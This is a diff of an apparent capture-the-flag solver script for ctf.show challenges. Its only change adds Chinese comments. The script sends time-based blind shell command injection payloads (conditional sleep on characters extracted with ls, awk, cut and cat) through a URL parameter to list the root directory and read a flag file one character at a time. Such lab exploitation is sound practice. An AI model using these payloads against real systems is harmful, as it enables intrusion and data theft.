@@ -145,7 +145,7 @@ for i in range(1,10):#行
         for n in str:
            #awk 'NR=={0}'逐行输出获取
            #cut -c {1} 截取单个字符
-            payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)
+            payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n) #使用 cut -c 1 提取第一个字符。
             #print(payload)
             url="http://873b2081-3b04-4517-a10d-dcb44382c44c.challenge.ctf.show/?c="+payload
             try:
@@ -172,7 +172,7 @@ for j in range(1,45):
     if key==1:
         break
     for n in str:
-        payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
+        payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n) #使用 cut -c 1 提取第一个字符。
         #print(payload)
         url="http://b76bf2c7-70e7-401f-a490-f5963e74b581.challenge.ctf.show/?c="+payload
         try:
